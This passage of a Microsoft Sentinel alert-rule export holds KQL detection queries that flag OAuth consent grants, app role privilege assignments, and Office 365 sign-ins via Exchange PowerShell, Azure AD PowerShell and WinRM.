FirstTime = min(TimeGenerated), LastTime = max(TimeGenerated), Duration = max(TimeGenerated) - min(TimeGenerated), Result = make_set_if(Result,isnotempty(Result))\r\n        , actor_type = make_set_if(actor_type,isnotempty(actor_type)), actor_id = make_set_if(actor_id,isnotempty(actor_id)), actor_name = make_set_if(actor_name,isnotempty(actor_name))\r\n        , OperationName = make_set_if(OperationName,isnotempty(OperationName)), tr_displayName = make_set_if(tr_displayName,isnotempty(tr_displayName)), tr_type = make_set_if(tr_type,isnotempty(tr_type))\r\n        , tr_id = make_set_if(tr_id,isnotempty(tr_id)), consentScope = make_set(set_consentScope), consentClientId = make_set_if(consentClientId,isnotempty(consentClientId))\r\n        , ServicePrincipalAssigned = make_set_if(ServicePrincipalAssigned,isnotempty(ServicePrincipalAssigned))\r\n        , AdminConsent = make_set_if(AdminConsent,isnotempty(AdminConsent)), AppOnlyConsent = make_set_if(AppOnlyConsent,isnotempty(AppOnlyConsent))\r\n        , consentPrincipalId = make_set_if(consentPrincipalId,isnotempty(consentPrincipalId)), consentResourceId = make_set_if(consentResourceId,isnotempty(consentResourceId))\r\n        , consentConsentType = make_set_if(consentConsentType,isnotempty(consentConsentType)), consentId = make_set_if(consentId,isnotempty(consentId))\r\n        , ForAllConsent = make_set_if(ForAllConsent,isnotempty(ForAllConsent)), ResultReason = make_set_if(ResultReason,isnotempty(ResultReason))\r\n        , ad_key = make_set_if(ad_key,isnotempty(ad_key)), ad_value = make_set_if(ad_value,isnotempty(ad_value)) by CorrelationId\r\n    | extend Actor = actor_name[0]\r\n    | extend ServicePrincipalAssigned = todynamic(tostring(ServicePrincipalAssigned[0]))[0]\r\n    | extend ForAllConsent = tobool(todynamic(tostring(ForAllConsent[0]))[0])\r\n    | extend AdminConsent = tobool(todynamic(tostring(AdminConsent[0]))[0])\r\n    | extend ConsentTypeAll = iif(tostring(consentConsentType[0])==\"Principal\",false,true)\r\n    | extend ActorId = actor_id[0]\r\n    | extend Result = Result[0]\r\n    | extend TargetResourceId = tostring(tr_id[0])\r\n    | extend TargetResource = tr_displayName[0]\r\n    | extend cntConsentScope = array_length(consentScope)\r\n    | extend sConsentScope = iif(cntConsentScope>0,iif(cntConsentScope<6,strcat('\"',trim_end(\"', \",strcat_array(consentScope,', ')),'\"'),tostring(cntConsentScope)),\"\")\r\n    | extend success_statement = iif(Result=~\"success\",\"consented to\",\"did not consent to\")\r\n    | extend consent_path = iif(ForAllConsent,\"on behalf of the entire organization\",iff(AdminConsent,\"an admin-level consent flow\",\"an app-level consent flow\"))\r\n    | extend principal_scope = iff(ConsentTypeAll,\"AllPrincipals\",strcat(\"Service Principal (\",ServicePrincipalAssigned,\")\"))\r\n    | extend threat_commentary_strategy = iif(OperationName has 'Consent',true,false)\r\n    | extend threat_commentary = iff(threat_commentary_strategy\r\n        , strcat(\"User \",Actor,\" (\",ActorId,\") \",success_statement,\" \",consent_path,\" allowing \",principal_scope,\" to have \",sConsentScope,\" permissions for use with the application named \\\"\",TargetResource,\"\\\" (\",TargetResourceId,\")\")\r\n        , \"Actor (ActorId) [consented to|did not consent to] [on behalf of the entire organization|an admin consent|an app consent flow] granting [AllPrincipals|Service Principal] ServicePrincipalAssigned (ServicePrincipalId) have [consentScope|cntConsentScope] permissions for use with the application named \\\"tr_displayName\\\"\"\r\n        )\r\n    | project FirstTime, LastTime, Duration, OperationName, CorrelationId, Actor, ActorId, ServicePrincipalAssigned, ForAllConsent, AdminConsent, ConsentTypeAll, TargetResource, TargetResourceId, ResultReason, Result, threat_commentary\r\n\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"Result"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"OperationName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078","T1134"],"displayName":"BAH_Grant_AppConsent_OAuth2","enabled":true,"description":"This analytic looks for user consent granted to application registrations by an administrator.\nPLATFORM:Azure AD\nMITRE:T00001;T1078,TA0004;T1134","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:35:13.5515935Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8d061e42-63bd-4a77-a8ce-39d22bc5e4b9","name":"8d061e42-63bd-4a77-a8ce-39d22bc5e4b9","etag":"\"8800730b-0000-2700-0000-66fdcd520000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for new credentials (secrets and certificates) added to application registrations. This version of the analytic excludes a known Azure AD Connect sync account that generates a lot of noise.\r\n//False Positives: None known\r\nlet excludeSync = '06c9ca02-8129-473d-8ae9-f964890b5706';\r\nlet Sparrow_BaseHunt_AuditLog=(opstable:(Category_:string,Operation:string)){\r\nAuditLogs | where InitiatedBy !has excludeSync | join kind=inner opstable on $left.OperationName == $right.Operation | mv-expand TargetResources, AdditionalDetails, InitiatedBy| extend ib_app = \"\", ib_user = \"\", tr_modifiedProperties = dynamic(null), tr_type = \"\", tr_displayName = \"\", tr_id = \"\"| extend tr = parse_json(TargetResources), ad = parse_json(AdditionalDetails), ib = parse_json(InitiatedBy)| evaluate bag_unpack(tr, 'tr_', columnsConflict='replace_source')| evaluate bag_unpack(ad, 'ad_', columnsConflict='replace_source')| evaluate bag_unpack(ib, 'ib_', columnsConflict='replace_source')| extend app_actor = iif(isnotempty(ib_app),true,false)| extend obj_actor = iif(app_actor, parse_json(ib_app), parse_json(ib_user))| extend actor_id = iif(app_actor,coalesce(obj_actor.appId,obj_actor.servicePrincipalId),obj_actor.userPrincipalName)| extend actor_name = iif(app_actor,obj_actor.displayName,obj_actor.userPrincipalName)| extend actor_type = iif(app_actor,\"App\",\"User\")| extend tr_modifiedProperties = iif(tr_modifiedProperties==\"[]\",dynamic(null),tr_modifiedProperties)| mv-expand tr_modifiedProperties| extend newValue = tostring(tr_modifiedProperties.newValue)| extend oldValue = tostring(tr_modifiedProperties.oldValue)| extend set1 = parse_json(newValue)| extend set2 = parse_json(oldValue)| extend diff = set_difference(set1, set2)| parse diff with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *| extend credential = case(keyType != \"\", keyType, \"Other/not logged\")};\r\nSparrow_BaseHunt_AuditLog(datatable(Category_: string, Operation: string) [\r\n'AppRoleAssignment_Operations', 'Add app role assignment to service principal'\r\n,\r\n'AppRoleAssignment_Operations', 'Add app role assignment grant to user'\r\n,\r\n'AppRoleAssignment_Operations', 'Add app role assignment to group'\r\n])\r\n| extend propertyName = tostring(tr_modifiedProperties.displayName)\r\n| extend bPermission = iif(propertyName == \"AppRole.Value\", true, false)\r\n| extend bApplication = iif(propertyName == \"ServicePrincipal.AppId\", true, false)\r\n| extend bApplicationName = iif(propertyName == \"ServicePrincipal.DisplayName\", true, false)\r\n| extend bUserObjectId = iif(propertyName == \"User.ObjectID\", true, false)\r\n| extend bUserUPN = iif(propertyName == \"User.UPN\", true, false)\r\n| extend diff = iff(tobool(binary_or(binary_or(binary_or(binary_or(bPermission, bApplication)\r\n, bApplicationName), bUserUPN), bUserObjectId))\r\n, set_difference(pack_array(set1), pack_array(set2)), diff)\r\n| extend PermissionsAssigned = iif(bPermission, diff, '')\r\n| extend ApplicationAssigned = iif(bApplication, diff, '')\r\n| extend ApplicationNameAssigned = iif(bApplicationName, diff, '')\r\n| extend UserObjectId = iif(bUserObjectId, diff, '')\r\n| extend UserUPN = iif(bUserUPN, diff, '')\r\n| extend tr_userPrincipalName = column_ifexists('tr_userPrincipalName', 'NaN')\r\n| summarize FirstTime = min(TimeGenerated), LastTime = max(TimeGenerated), Duration = max(TimeGenerated) - min(TimeGenerated), Result = make_set_if(Result, isnotempty(Result))\r\n, actor_type = make_set_if(actor_type, isnotempty(actor_type)), actor_id = make_set_if(actor_id, isnotempty(actor_id)), actor_name = make_set_if(actor_name, isnotempty(actor_name))\r\n, OperationName = make_set_if(OperationName, isnotempty(OperationName)), tr_displayName = make_set_if(tr_displayName, isnotempty(tr_displayName)), tr_type = make_set_if(tr_type, isnotempty(tr_type))\r\n, tr_id = make_set_if(tr_id, isnotempty(tr_id))\r\n, UserId = make_set_if(UserObjectId, isnotempty(UserObjectId))\r\n, ApplicationAssigned = make_set_if(ApplicationAssigned, isnotempty(ApplicationAssigned)), PermissionsAssigned = make_set_if(PermissionsAssigned, isnotempty(PermissionsAssigned))\r\n, tr_userPrincipalName = make_set(tr_userPrincipalName)\r\n, ApplicationNameAssigned = make_set_if(ApplicationNameAssigned, isnotempty(ApplicationNameAssigned)), ResultReason = make_set_if(ResultReason, isnotempty(ResultReason))\r\nby CorrelationId\r\n| extend Actor = actor_name[0]\r\n| extend Actor = strcat(iif(actor_type has \"App\", 'Application ', ''), Actor)\r\n| extend ActorId = actor_id[0]\r\n| extend UserPrincipalName = tr_userPrincipalName[0]\r\n| extend ApplicationAssignedId = parse_json(tostring(ApplicationAssigned[0]))[0]\r\n| extend ApplicationNameAssigned = todynamic(tostring(ApplicationNameAssigned[0]))[0]\r\n| extend sApplicationNameAssigned = strcat('\"', iif(isempty(ApplicationNameAssigned), '', ApplicationNameAssigned), '\"')\r\n| extend Result = Result[0]\r\n| extend UserId = todynamic(tostring(UserId[0]))[0]\r\n| mv-apply PermissionsAssigned on (summarize PermissionsAssigned=make_list_if(todynamic(tostring(PermissionsAssigned))[0], isnotempty(todynamic(tostring(PermissionsAssigned))[0])))\r\n| extend cntPermissionsAssigned = array_length(PermissionsAssigned)\r\n| extend sPermissionsAssigned = strcat(iif(cntPermissionsAssigned > 0, iif(cntPermissionsAssigned < 6, strcat('\"', trim_end(\"', \", strcat_array(PermissionsAssigned, ', ')), '\"')\r\n, tostring(cntPermissionsAssigned)), \"\"), ' rights')\r\n| extend TargetedResource = tr_displayName[0]\r\n| mv-apply TargetedResourceId = tr_id on (where tostring(UserId) != TargetedResourceId)\r\n| extend success_statement = iif(Result =~ \"success\", iif(sPermissionsAssigned != \" rights\", 'granted ', 'granted null')\r\n, iif(sPermissionsAssigned != \" rights\", 'failed to grant ', 'failed to grant null'))\r\n| extend threat_commentary_strategy = iif(OperationName has 'Add app role assignment to service principal', 1, 0)\r\n| extend threat_commentary = iff(threat_commentary_strategy == 0\r\n, strcat(Actor, ' (', ActorId, ') ', success_statement, sPermissionsAssigned, ' to user account ', UserPrincipalName, ' (', UserId, ') for use with the application named \"'\r\n, TargetedResource, '\" (', TargetedResourceId, ').')\r\n, strcat(Actor, ' (', ActorId, ') ', success_statement, sPermissionsAssigned, ' to service principal account ', sApplicationNameAssigned, ' (', ApplicationAssignedId\r\n, ') for use with the application named \"', TargetedResource, '\" (', TargetedResourceId, ').')\r\n)\r\n| project FirstTime, LastTime, Duration, OperationName, CorrelationId, Actor, ActorId, UserPrincipalName, UserId, ApplicationNameAssigned, ApplicationAssignedId, PermissionsAssigned\r\n, TargetedResource, TargetedResourceId, ResultReason, Result, threat_commentary","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"ActorId"}]},{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"ApplicationAssignedId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078","T1134"],"displayName":"BAH_AppServicePrinciple_ElevatedPrivileges","enabled":true,"description":"This analytic looks for new credentials (secrets and certificates) added to application registrations. This version of the analytic excludes a known Azure AD Connect sync account that generates a lot of noise.\nPLATFORM:Windows\nMITRE:TA0001;T1078;T1078.002;T1078.003,TA0003;T1078;T1078.002;T1078.003,TA0004;T1078;T1078.002;T1078.003;T1134,TA0005;T1078;T1078.002;T1078.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:46:40.9344998Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/2a4fb5dd-b394-4a3f-8434-0be86b056b93","name":"2a4fb5dd-b394-4a3f-8434-0be86b056b93","etag":"\"8800fc09-0000-2700-0000-66fdcd370000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for new credentials (secrets and certificates) added to application registrations. This version of the analytic includes a known Azure AD Connect sync account that generates a lot of noise.\r\n//False Positives: None known\r\nlet excludeSync = '06c9ca02-8129-473d-8ae9-f964890b5706';\r\nlet Sparrow_BaseHunt_AuditLog=(opstable:(Category_:string,Operation:string)){\r\nAuditLogs | where InitiatedBy has excludeSync | join kind=inner opstable on $left.OperationName == $right.Operation | mv-expand TargetResources, AdditionalDetails, InitiatedBy| extend ib_app = \"\", ib_user = \"\", tr_modifiedProperties = dynamic(null), tr_type = \"\", tr_displayName = \"\", tr_id = \"\"| extend tr = parse_json(TargetResources), ad = parse_json(AdditionalDetails), ib = parse_json(InitiatedBy)| evaluate bag_unpack(tr, 'tr_', columnsConflict='replace_source')| evaluate bag_unpack(ad, 'ad_', columnsConflict='replace_source')| evaluate bag_unpack(ib, 'ib_', columnsConflict='replace_source')| extend app_actor = iif(isnotempty(ib_app),true,false)| extend obj_actor = iif(app_actor, parse_json(ib_app), parse_json(ib_user))| extend actor_id = iif(app_actor,coalesce(obj_actor.appId,obj_actor.servicePrincipalId),obj_actor.userPrincipalName)| extend actor_name = iif(app_actor,obj_actor.displayName,obj_actor.userPrincipalName)| extend actor_type = iif(app_actor,\"App\",\"User\")| extend tr_modifiedProperties = iif(tr_modifiedProperties==\"[]\",dynamic(null),tr_modifiedProperties)| mv-expand tr_modifiedProperties| extend newValue = tostring(tr_modifiedProperties.newValue)| extend oldValue = tostring(tr_modifiedProperties.oldValue)| extend set1 = parse_json(newValue)| extend set2 = parse_json(oldValue)| extend diff = set_difference(set1, set2)| parse diff with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *| extend credential = case(keyType != \"\", keyType, \"Other/not logged\")};\r\nSparrow_BaseHunt_AuditLog(datatable(Category_: string, Operation: string) [\r\n'AppRoleAssignment_Operations', 'Add app role assignment to service principal'\r\n,\r\n'AppRoleAssignment_Operations', 'Add app role assignment grant to user'\r\n,\r\n'AppRoleAssignment_Operations', 'Add app role assignment to group'\r\n])\r\n| extend propertyName = tostring(tr_modifiedProperties.displayName)\r\n| extend bPermission = iif(propertyName == \"AppRole.Value\", true, false)\r\n| extend bApplication = iif(propertyName == \"ServicePrincipal.AppId\", true, false)\r\n| extend bApplicationName = iif(propertyName == \"ServicePrincipal.DisplayName\", true, false)\r\n| extend bUserObjectId = iif(propertyName == \"User.ObjectID\", true, false)\r\n| extend bUserUPN = iif(propertyName == \"User.UPN\", true, false)\r\n| extend diff = iff(tobool(binary_or(binary_or(binary_or(binary_or(bPermission, bApplication)\r\n, bApplicationName), bUserUPN), bUserObjectId))\r\n, set_difference(pack_array(set1), pack_array(set2)), diff)\r\n| extend PermissionsAssigned = iif(bPermission, diff, '')\r\n| extend ApplicationAssigned = iif(bApplication, diff, '')\r\n| extend ApplicationNameAssigned = iif(bApplicationName, diff, '')\r\n| extend UserObjectId = iif(bUserObjectId, diff, '')\r\n| extend UserUPN = iif(bUserUPN, diff, '')\r\n| extend tr_userPrincipalName = column_ifexists('tr_userPrincipalName', 'NaN')\r\n| summarize FirstTime = min(TimeGenerated), LastTime = max(TimeGenerated), Duration = max(TimeGenerated) - min(TimeGenerated), Result = make_set_if(Result, isnotempty(Result))\r\n, actor_type = make_set_if(actor_type, isnotempty(actor_type)), actor_id = make_set_if(actor_id, isnotempty(actor_id)), actor_name = make_set_if(actor_name, isnotempty(actor_name))\r\n, OperationName = make_set_if(OperationName, isnotempty(OperationName)), tr_displayName = make_set_if(tr_displayName, isnotempty(tr_displayName)), tr_type = make_set_if(tr_type, isnotempty(tr_type))\r\n, tr_id = make_set_if(tr_id, isnotempty(tr_id))\r\n, UserId = make_set_if(UserObjectId, isnotempty(UserObjectId))\r\n, ApplicationAssigned = make_set_if(ApplicationAssigned, isnotempty(ApplicationAssigned)), PermissionsAssigned = make_set_if(PermissionsAssigned, isnotempty(PermissionsAssigned))\r\n, tr_userPrincipalName = make_set(tr_userPrincipalName)\r\n, ApplicationNameAssigned = make_set_if(ApplicationNameAssigned, isnotempty(ApplicationNameAssigned)), ResultReason = make_set_if(ResultReason, isnotempty(ResultReason))\r\nby CorrelationId\r\n| extend Actor = actor_name[0]\r\n| extend Actor = strcat(iif(actor_type has \"App\", 'Application ', ''), Actor)\r\n| extend ActorId = actor_id[0]\r\n| extend UserPrincipalName = tr_userPrincipalName[0]\r\n| extend ApplicationAssignedId = parse_json(tostring(ApplicationAssigned[0]))[0]\r\n| extend ApplicationNameAssigned = todynamic(tostring(ApplicationNameAssigned[0]))[0]\r\n| extend sApplicationNameAssigned = strcat('\"', iif(isempty(ApplicationNameAssigned), '', ApplicationNameAssigned), '\"')\r\n| extend Result = Result[0]\r\n| extend UserId = todynamic(tostring(UserId[0]))[0]\r\n| mv-apply PermissionsAssigned on (summarize PermissionsAssigned=make_list_if(todynamic(tostring(PermissionsAssigned))[0], isnotempty(todynamic(tostring(PermissionsAssigned))[0])))\r\n| extend cntPermissionsAssigned = array_length(PermissionsAssigned)\r\n| extend sPermissionsAssigned = strcat(iif(cntPermissionsAssigned > 0, iif(cntPermissionsAssigned < 6, strcat('\"', trim_end(\"', \", strcat_array(PermissionsAssigned, ', ')), '\"')\r\n, tostring(cntPermissionsAssigned)), \"\"), ' rights')\r\n| extend TargetedResource = tr_displayName[0]\r\n| mv-apply TargetedResourceId = tr_id on (where tostring(UserId) != TargetedResourceId)\r\n| extend success_statement = iif(Result =~ \"success\", iif(sPermissionsAssigned != \" rights\", 'granted ', 'granted null')\r\n, iif(sPermissionsAssigned != \" rights\", 'failed to grant ', 'failed to grant null'))\r\n| extend threat_commentary_strategy = iif(OperationName has 'Add app role assignment to service principal', 1, 0)\r\n| extend threat_commentary = iff(threat_commentary_strategy == 0\r\n, strcat(Actor, ' (', ActorId, ') ', success_statement, sPermissionsAssigned, ' to user account ', UserPrincipalName, ' (', UserId, ') for use with the application named \"'\r\n, TargetedResource, '\" (', TargetedResourceId, ').')\r\n, strcat(Actor, ' (', ActorId, ') ', success_statement, sPermissionsAssigned, ' to service principal account ', sApplicationNameAssigned, ' (', ApplicationAssignedId\r\n, ') for use with the application named \"', TargetedResource, '\" (', TargetedResourceId, ').')\r\n)\r\n| project FirstTime, LastTime, Duration, OperationName, CorrelationId, Actor, ActorId, UserPrincipalName, UserId, ApplicationNameAssigned, ApplicationAssignedId, PermissionsAssigned\r\n, TargetedResource, TargetedResourceId, ResultReason, Result, threat_commentary","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"ActorId"}]},{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"ApplicationAssignedId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1078","T1134"],"displayName":"BAH_AppServicePrinciple_ElevatedPrivileges_includeSync","enabled":true,"description":"This analytic looks for new credentials (secrets and certificates) added to application registrations. This version of the analytic excludes a known Azure AD Connect sync account that generates a lot of noise.\nPLATFORM:Windows\nMITRE:TA0001;T1078;T1078.002;T1078.003,TA0003;T1078;T1078.002;T1078.003,TA0004;T1078;T1078.002;T1078.003;T1134,TA0005;T1078;T1078.002;T1078.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:46:13.9711455Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5bb7b0a1-2ed7-4b0b-bdc1-25f6836f7736","name":"5bb7b0a1-2ed7-4b0b-bdc1-25f6836f7736","etag":"\"870087bd-0000-2700-0000-66fdc8110000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for sign-in to Office 365 from PowerShell.\r\n//False Positives: None known\r\nSigninLogs\r\n| where AppDisplayName contains \"Microsoft Exchange REST API Based Powershell\"\r\n| where Identity != \"net scout\"\r\n| extend ResultDescription = tostring(ResultDescription)\r\n| extend City = tostring(LocationDetails.city)\r\n| extend Country = tostring(LocationDetails.countryOrRegion)\r\n| extend State = tostring(LocationDetails.state)\r\n| extend AuthMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)\r\n| extend AuthMethodDetail = tostring(parse_json(AuthenticationDetails)[0].authenticationMethodDetail)\r\n| extend succeeded_ = tostring(parse_json(AuthenticationDetails)[0].succeeded)\r\n| project CreatedDateTime, Identity, UserPrincipalName, AuthenticationRequirement, AppDisplayName, ClientAppUsed, AuthMethod, AuthMethodDetail, ResultDescription, City, State, Country, IPAddress, succeeded_\r\n| sort by CreatedDateTime asc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Identity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration","InitialAccess"],"techniques":["T1078"],"displayName":"BAH_POSH_EXO_Login","enabled":false,"description":"This analytic looks for sign-in to Office 365 from PowerShell.\nPLATFORM:Microsoft 365,Windows\nMITRE:T00001;T1078","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:24:17.4042499Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5fb2662c-0a51-4984-9e89-56920b424988","name":"5fb2662c-0a51-4984-9e89-56920b424988","etag":"\"87000bbc-0000-2700-0000-66fdc7fa0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for sign-in to Office 365 from Exchange PowerShell. It is a deprecated method of performing administrative activities within the tenant and should be investigated.\r\n//False Positives: None known\r\nSigninLogs\r\n| where AppId has \"a0c73c16-a7e3-4564-9a95-2bdf47383716\" // AppID for Exchange Online PowerShell\r\n| extend failureReason_ = tostring(Status.failureReason)\r\n| extend City = tostring(LocationDetails.city)\r\n| extend Country = tostring(LocationDetails.countryOrRegion)\r\n| extend State = tostring(LocationDetails.state)\r\n| project TimeGenerated, Identity, UserType, AppDisplayName, AppId, AuthenticationRequirement, Status, failureReason_, City, State, Country, IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"AppId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration","InitialAccess"],"techniques":["T1078"],"displayName":"BAH_POSH_EXO_SignIn","enabled":true,"description":"This analytic looks for sign-in to Office 365 from Exchange PowerShell. It is a deprecated method of performing administrative activities within the tenant and should be investigated.\nPLATFORM:Windows\nMITRE:TA0001;T1078;T1078.001;T1078;T1078.002;T1078;T1078.003","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:23:54.117211Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f2496011-3e7e-4569-a1a4-f288baecb15a","name":"f2496011-3e7e-4569-a1a4-f288baecb15a","etag":"\"87003ff1-0000-2700-0000-66fdcb840000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for sign-in to Office 365 from Azure AD PowerShell.\r\n//False Positives: None known\r\nSigninLogs\r\n| where AppId has \"1b730954-1685-4b74-9bfd-dac224a7b894\" // AppID for Azure Active Directory PowerShell\r\n| extend failureReason_ = tostring(Status.failureReason)\r\n| extend City = tostring(LocationDetails.city)\r\n| extend Country = tostring(LocationDetails.countryOrRegion)\r\n| extend State = tostring(LocationDetails.state)\r\n| project TimeGenerated, Identity, UserType, AppDisplayName, AppId, AuthenticationRequirement, Status, failureReason_, City, State, Country, IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration","InitialAccess"],"techniques":["T1078"],"displayName":"BAH_Detect_AAD_POSH","enabled":false,"description":"This analytic looks for sign-in to Office 365 from Azure AD PowerShell.\nPLATFORM:Microsoft 365,Azure AD,IaaS\nMITRE:TA0001;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:39:00.0219946Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ef4d94cc-3dba-41ca-a24c-4a05ac319d8a","name":"ef4d94cc-3dba-41ca-a24c-4a05ac319d8a","etag":"\"8700487a-0000-2700-0000-66fdc3e00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5M","queryPeriod":"PT6M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Matt Schwartz\r\n//Description: This analytic looks for sign-in to Office 365 from WinRM, which is the legacy Office 365 management protocol that has been deprecated in favor of more modern PowerShell modules.\r\n//False Positives: None known\r\nSigninLogs\r\n| where UserAgent has \"WinRM\"\r\n| where Identity != \"net scout\"\r\n| extend ResultDescription = tostring(ResultDescription)\r\n| extend City = tostring(LocationDetails.city)\r\n| extend Country = tostring(LocationDetails.countryOrRegion)\r\n| extend State = tostring(LocationDetails.state)\r\n| extend AuthMethod = tostring(parse_json(AuthenticationDetails)[0].authenticationMethod)\r\n| extend AuthMethodDetail = tostring(parse_json(AuthenticationDetails)[0].authenticationMethodDetail)\r\n| extend succeeded_ = tostring(parse_json(AuthenticationDetails)[0].succeeded)\r\n| project CreatedDateTime, Identity, UserAgent, UserPrincipalName, AuthenticationRequirement, AppDisplayName, ClientAppUsed, AuthMethod, AuthMethodDetail, ResultDescription, City, State, Country, IPAddress, succeeded_\r\n| sort by CreatedDateTime 